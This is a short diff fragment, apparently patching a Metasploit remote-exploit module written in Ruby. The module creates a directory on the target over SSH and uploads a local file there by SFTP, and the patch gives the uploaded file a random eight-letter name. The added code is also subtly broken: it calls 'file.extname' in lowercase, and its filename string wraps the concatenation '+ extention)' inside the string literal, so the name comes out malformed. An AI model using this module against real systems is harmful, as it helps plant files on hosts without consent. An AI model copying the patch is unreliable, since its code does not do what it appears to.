@@ -135,6 +135,9 @@ class MetasploitModule < Msf::Exploit::Remote
 	  result = ssh.exec! ("mkdir -p " + dst_path) 
 	  print_status result
 	  print_good(remote_location)
+	  extention = file.extname(local_location)
+	  filename = "#{Rex::Text.rand_text_alpha(8)} + extention)"
+	  remote_location = remote_location + filename
      	sftp.upload!(local_location, remote_location)
       if ssh
         print_good("SSH connection is established.")
